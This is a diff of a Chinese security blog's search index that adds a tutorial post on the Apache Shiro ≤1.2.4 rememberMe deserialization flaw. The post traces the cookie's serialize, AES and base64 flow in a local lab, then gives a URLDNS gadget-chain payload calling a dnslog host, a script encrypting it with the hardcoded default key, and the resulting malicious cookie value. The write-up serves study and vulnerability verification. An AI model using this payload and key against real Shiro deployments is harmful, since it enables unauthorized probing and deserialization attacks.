@@ -4438,7 +4438,7 @@
     <title>zico2靶机打靶记录</title>
     <url>/2023/09/08/zico2%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h2 id="一、漏洞平台搭建"><a href="#一、漏洞平台搭建" class="headerlink" title="一、漏洞平台搭建"></a>一、漏洞平台搭建</h2><p>我们下载得到的是一个ova后缀的文件，OVA 文件是一种打包格式，它将虚拟机的相关文件（如虚拟磁盘映像、虚拟机配置信息、操作系统镜像等）打包成一个单独的文件，以便于传输、分享和部署虚拟机。</p>
-<p>我这里可以直接通过kali导入这个靶场</p>
+<p>我这里可以直接导入这个靶场</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -4770,7 +4770,7 @@
     <url>/2023/09/08/DC-3%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="DC-3靶机打靶记录"><a href="#DC-3靶机打靶记录" class="headerlink" title="DC-3靶机打靶记录"></a>DC-3靶机打靶记录</h1><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>靶机下载地址：<a class="link"   href="https://www.vulnhub.com/entry/dc-32,312/" >https://www.vulnhub.com/entry/dc-32,312/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>下载得到是一个ova文件</p>
-<p>我们这里直接使用kali导入就行</p>
+<p>我们这里直接导入就行</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -5150,7 +5150,7 @@
     <url>/2023/09/09/DC-1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="一、靶机搭建"><a href="#一、靶机搭建" class="headerlink" title="一、靶机搭建"></a>一、靶机搭建</h1><p>靶机下载地址：<a class="link"   href="https://www.vulnhub.com/entry/dc-1,292/" >https://www.vulnhub.com/entry/dc-1,292/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>下载得到是一个ova文件</p>
-<p>我们这里直接使用kali导入就行</p>
+<p>我们这里直接导入就行</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -5488,6 +5488,264 @@
 ]]></content>
       <tags>
         <tag>渗透-靶机-DC系列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初探shiro反序列化</title>
+    <url>/2023/09/12/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/</url>
+    <content><![CDATA[<h1 id="一、关于shiro"><a href="#一、关于shiro" class="headerlink" title="一、关于shiro"></a>一、关于shiro</h1><p>shiro是一种开源的java安全框架。它提供了身份验证（Authentication）、授权（Authorization）、加密（Cryptography）和会话管理（Session Management）等安全功能，用于保护Web应用程序和非Web应用程序中的安全性。可运行在web应用和非web应用中。使用Shiro框架可以使应用程序的安全性得到提高，同时也可以使开发者更加方便地进行身份验证、授权和会话管理等操作，减少了开发的复杂度和工作量。</p>
+<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><p>github有可以直接利用的环境</p>
+<p>我们这里直接从github导入就行了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure></div>
+
+<p>编辑shiro&#x2F;samples&#x2F;web目录下的pom.xml,将jstl的版本修改为1.2。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>导入项目，然后配置Tomcat环境</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912201106389.png"
+                      alt="image-20230912201106389"
+                ></p>
+<p>shiro为了保持用户登录状态提供了一个rememberme选项</p>
+<p>当我们勾选了这个选项会在cookie中生成一个字符串用户保存用户的登录状态</p>
+<p>从而使用户再访问时不用再次登录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912201253811.png"
+                      alt="image-20230912201253811"
+                ></p>
+<h1 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h1><h2 id="加密流程分析"><a href="#加密流程分析" class="headerlink" title="加密流程分析"></a>加密流程分析</h2><p>生成字段的位置在org.apache.shiro.mgt.DefaultSecurityManager#login</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Subject login(Subject subject, AuthenticationToken token) throws AuthenticationException &#123;</span><br><span class="line">    AuthenticationInfo info;</span><br><span class="line">    try &#123;</span><br><span class="line">        info = authenticate(token);</span><br><span class="line">    &#125; catch (AuthenticationException ae) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            onFailedLogin(token, ae, subject);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            if (log.isInfoEnabled()) &#123;</span><br><span class="line">                log.info(&quot;onFailedLogin method threw an &quot; +</span><br><span class="line">                        &quot;exception.  Logging and propagating original AuthenticationException.&quot;, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        throw ae; //propagate</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Subject loggedIn = createSubject(token, info, subject);</span><br><span class="line"></span><br><span class="line">    onSuccessfulLogin(token, info, loggedIn);</span><br><span class="line"></span><br><span class="line">    return loggedIn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这段代码主要实现了用户的验证和认证</p>
+<p>在认证成功后会进入  <code>onSuccessfulLogin()</code>方法</p>
+<p>跟进  <code>onSuccessfulLogin()</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912183417105.png"
+                      alt="image-20230912183417105"
+                ></p>
+<p>继续跟进到<code>rememberMeSuccessfulLogin</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912183508511.png"
+                      alt="image-20230912183508511"
+                ></p>
+<p>我们这里在<code>RememberMeManager rmm = getRememberMeManager();</code>处打上断点</p>
+<p>然后打开调试模式，然后进行登录并勾选remember选项</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912183639612.png"
+                      alt="image-20230912183639612"
+                ></p>
+<p>然后我们的代码会直接跳到我们打断点的地方</p>
+<p>我们打断的的地方其实就是获取remeber这个对象</p>
+<p>然后会根据是否获取到来判读我们是否勾选了remeber选项</p>
+<p>勾选了remeber选项这里就会对获取到的对象调用<code>onSuccessfulLogin</code>方法</p>
+<p>跟进到<code>onSuccessfulLogin</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912184232532.png"
+                      alt="image-20230912184232532"
+                ></p>
+<p>我们跟进到<code>onSuccessfulLogin</code>方法发现这里调用了<code>forgetIdentity</code>方法对subject进行处理，这里的subject对象表示单个用户的状态和安全操作，包含认证、授权等。</p>
+<p>继续跟进到<code>forgetIdentity</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912184552958.png"
+                      alt="image-20230912184552958"
+                ></p>
+<p>然后继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912184640754.png"
+                      alt="image-20230912184640754"
+                ></p>
+<p>这里的<code>forgetIdentity</code>的作用是清除上次的cookie里认证值，然后又调用了<code>removeFrom</code>方法</p>
+<p>我们这里跟进这个方法，分析一下这个方法做了些什么</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void removeFrom(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String name = getName();</span><br><span class="line">    String value = DELETED_COOKIE_VALUE;</span><br><span class="line">    String comment = null; //don&#x27;t need to add extra size to the response - comments are irrelevant for deletions</span><br><span class="line">    String domain = getDomain();</span><br><span class="line">    String path = calculatePath(request);</span><br><span class="line">    int maxAge = 0; //always zero for deletion</span><br><span class="line">    int version = getVersion();</span><br><span class="line">    boolean secure = isSecure();</span><br><span class="line">    boolean httpOnly = false; //no need to add the extra text, plus the value &#x27;deleteMe&#x27; is not sensitive at all</span><br><span class="line"></span><br><span class="line">    addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly);</span><br><span class="line"></span><br><span class="line">    log.trace(&quot;Removed &#x27;&#123;&#125;&#x27; cookie by setting maxAge=0&quot;, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>这里<code>removeFrom</code>主要是在set-cookie中添加了一个<code>rememberMe=deleteMe</code></p>
+<p>通过上面的分析我们可以知道<code>forgetIdentity</code>最终主要实现了消除上次登录cookie里的认证值，然后在cookie中添加rememberMe字段</p>
+<p>那我们跳回到<code>onSuccessfulLogin</code>方法</p>
+<p>然后<code>isRememberMe(token)</code>会判断我们是否设置了rememberMe字段</p>
+<p>设置会进入到</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">rememberIdentity(subject, token, info);</span><br></pre></td></tr></table></figure></div>
+
+<p>我们这里继续跟进到<code>rememberIdentity</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912185544630.png"
+                      alt="image-20230912185544630"
+                ></p>
+<p>这里使用 <code>getIdentityToRemember</code> 方法从 <code>subject</code> 和 <code>authcInfo</code> 参数中获取身份信息并将其存储在 <code>principals</code> 中。</p>
+<p>继续跟进到<code>rememberIdentity</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912190556104.png"
+                      alt="image-20230912190556104"
+                ></p>
+<p>这里的<code>accountPrincipals</code>就是我们上面存储的身份信息</p>
+<p>这里调用<code>convertPrincipalsToBytes</code>方法对我们存储的身份信息进行处理</p>
+<p>继续跟进到<code>convertPrincipalsToBytes</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912190918509.png"
+                      alt="image-20230912190918509"
+                ></p>
+<p>在这个方法中调用<code>serialize</code>方法对存储的身份信息进行了序列化</p>
+<p>我们跟进到序列化方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912191638110.png"
+                      alt="image-20230912191638110"
+                ></p>
+<p>到这里就可以很明显的看懂对用户名进行了序列化</p>
+<p>我们继续回到<code>convertPrincipalsToBytes</code>方法</p>
+<p>在上面对用户进行序列化处理后转化为字节数组</p>
+<p>然后会调用encrypt对字节数组进行加密</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912191745733.png"
+                      alt="image-20230912191745733"
+                ></p>
+<p>我们跟进到这个用于加密的方法 <code>encrypt</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912192109930.png"
+                      alt="image-20230912192109930"
+                ></p>
+<p>这里是对字符数组进行加密的具体实现</p>
+<p>我们根据调试信息可以看到加密算法为AES，模式为CBC，填充算法为PKCS5Padding。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912192040778.png"
+                      alt="image-20230912192040778"
+                ></p>
+<p>这里的算法是AES，这里的<code>getEncryptionCipherKey</code>就是获得默认密钥进行加密的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912192702539.png"
+                      alt="image-20230912192702539"
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==就是加密用的固定密钥</span><br></pre></td></tr></table></figure></div>
+
+<p>加密完成后，这里跳回到<code>rememberIdentity</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912192802719.png"
+                      alt="image-20230912192802719"
+                ></p>
+<p>跟进到<code>rememberSerializedIdentity</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912192939517.png"
+                      alt="image-20230912192939517"
+                ></p>
+<p>在这里会对加密后的字节数组进行base64编码，然后会将生成的字符串保存在cookie中。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912193344403.png"
+                      alt="image-20230912193344403"
+                ></p>
+<p>也就是我们cookie中rememberMe的值</p>
+<p>那么通过上面的分析我们知道加密的过程大概就是序列化，然后进行AES加密，最后进行base64编码</p>
+<p>那么解密的过程就和上面大概反过来</p>
+<h2 id="解密流程分析"><a href="#解密流程分析" class="headerlink" title="解密流程分析"></a>解密流程分析</h2><p>对cookie中rememberMe的解密代码也是在<code>AbstractRememberMeManager.java</code>中实现</p>
+<p>我们这里直接在<code>getRememberedPrincipals</code>方法打断点</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912194036579.png"
+                      alt="image-20230912194036579"
+                ></p>
+<p>我们这里跟进到<code>getRememberedSerializedIdentity</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912194319354.png"
+                      alt="image-20230912194319354"
+                ></p>
+<p>可以看到这里getRememberedSerializedIdentity对返回cookie中rememberMe的base64解码处理。</p>
+<p>然后调用<code>convertBytesToPrincipals</code>方法对解码后的字节处理</p>
+<p>我们这里跟进去分析一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912194537446.png"
+                      alt="image-20230912194537446"
+                ></p>
+<p>这里调用decrypt对字节进行解密处理</p>
+<p>然后回到<code>convertBytesToPrincipals</code></p>
+<p>对解密后的字节调用<code>deserialize</code>处理</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912195200809.png"
+                      alt="image-20230912195200809"
+                ></p>
+<p>这里调用了readObject方法对字节进行反序列化</p>
+<p>这也是我们漏洞的所在，因为通过我们上面的分析，我们知道对序列化后的字节数组的加密使用的是aes加密，aes使用的默认的固定密钥加密，那我们只需要将我们的反序列化攻击链通过aes进行加密，然后把cookie中的remember的值给替换掉，在进行到上面这一步进行反序列化的时候就会造成反序列化的利用。</p>
+<p>产生这个漏洞的最主要原因就是因为固定key，导致攻击者可以替换掉这个rememberme字段的值为自己的攻击链，造成反序列化漏洞利用。</p>
+<h1 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h1><p>在上面我们分析了shiro框架rememberme字段的加密和解密流程，然后对shiro反序列化漏洞的原因进行了分析</p>
+<p>那么我们这里尝试通过URLDNS利用链对这个反序列化漏洞进行验证。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class URLDNS &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap map = new HashMap();</span><br><span class="line">        URL url = new URL(&quot;http://k9ddxg.dnslog.cn&quot;);</span><br><span class="line">        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        f.setAccessible(true); // 绕过Java语言权限控制检查的权限</span><br><span class="line">        f.set(url,123); // 设置hashcode的值为-1的其他任何数字</span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        map.put(url,123); // 调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询</span><br><span class="line">        f.set(url,-1); // 将hashcode重新设置为-1，确保在反序列化成功触发</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            FileOutputStream fileOutputStream = new FileOutputStream(&quot;./urldns.ser&quot;);</span><br><span class="line">            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);</span><br><span class="line"></span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            FileInputStream fileInputStream = new FileInputStream(&quot;./urldns.ser&quot;);</span><br><span class="line">            ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里先使用URLDNS利用链生成一个利用payload，这里的url是在DNSlog生成的</p>
+<p>然后通过AES加密脚本进行固定key加密</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.shiro.crypto.AesCipherService;</span><br><span class="line">import org.apache.shiro.codec.CodecSupport;</span><br><span class="line">import org.apache.shiro.util.ByteSource;</span><br><span class="line">import org.apache.shiro.codec.Base64;</span><br><span class="line">import org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line">import java.nio.file.FileSystems;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;d://urldns.ser&quot;));</span><br><span class="line"></span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));</span><br><span class="line"></span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HWChkU+6Uq102u6EwcmZwsXxpbfwTHYkfuRtp3s0xdfyYe3IVH/SV+937NDpl/PnifK3LrVG+dz4lhEgAiySHCi8zN4Ak7gD9JzMVqDhvUmgwy2nI6iEe2ayMsqNcyCUVjVlmX3cYLRLvGx+WjoCa7PQ5fPhjLMvTx7nr4hYv1UsWtIlRX5vLc0ywGvBPuc4ifnOI1CnSJd7QPBTv5PGkbWKlPySpQXKxcLPtr7EKpz+rvetwM70oRKISG1IBx4j/wRv6BOT6M40fMLBBLxXHf1NUgPYKnRyurTW4zAw0Qat0VUlRXpoO9NcMGYUmHqkrNuqP9bFpF4TJQUIoQD+OoznEpGXcBHvcfuVho7NUkAFt+emJwYiJXG7UGS8q6Lo7BkBvSQZPNBTfC89wRf/KE1u67LOY/IQIYlEdm9Ir7Mqd0uHfUuwdBTE8D1Y2GgXG7kiWVPNqWIjkS9XX015yA==</span><br></pre></td></tr></table></figure></div>
+
+<p>启动环境抓包</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912200050878.png"
+                      alt="image-20230912200050878"
+                ></p>
+<p>将生成的rememberMe字段的值替换成我们攻击payload</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912200144016.png"
+                      alt="image-20230912200144016"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230912200157142.png"
+                      alt="image-20230912200157142"
+                ></p>
+<p>然后我们在DNSLOG页面可以看到地址被成功解析了，说明这里存在反序列化漏洞，反序列化利于成功了。</p>
+<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>其实通过上面的分析，我们已经能够理解尝试shiro反序列化的原因是因为固定key加密。反过来我们要想要对这个漏洞进行利用，需要知道key才行。</p>
+<p>Shiro≤1.2.4中默认密钥为kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。官方针对这个漏洞的修复方式是去掉了默认的Key，生成随机的Key。</p>
+<p>我们上面只是通过URLDNS利用链对shiro反序列化这个漏洞进行了验证，但是并没有造成什么实质性的利用，后面将学习shiro配合我们前面学习CC链进行攻击利用。</p>
+]]></content>
+      <tags>
+        <tag>JAVA</tag>
       </tags>
   </entry>
 </search>
